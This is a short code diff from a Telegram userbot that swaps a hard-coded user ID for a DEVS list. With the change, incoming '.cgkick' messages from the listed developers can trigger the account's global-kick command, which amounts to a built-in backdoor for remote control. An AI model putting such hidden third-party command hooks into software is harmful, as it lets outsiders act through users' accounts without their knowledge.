@@ -9,7 +9,7 @@ from telethon.tl.types import (
 from telethon.tl.functions.contacts import BlockRequest, UnblockRequest
 
 from userbot.events import register
-from userbot import ALIVE_NAME, CMD_HELP
+from userbot import ALIVE_NAME, DEVS, CMD_HELP
 
 
 async def get_user_from_event(event):
@@ -59,7 +59,7 @@ except BaseException:
 
 
 @register(outgoing=True, pattern=r"^\.gkick(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664, pattern=r"^\.cgkick")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgkick")
 async def gspide(rk):
     lazy = rk
     sender = await lazy.get_sender()
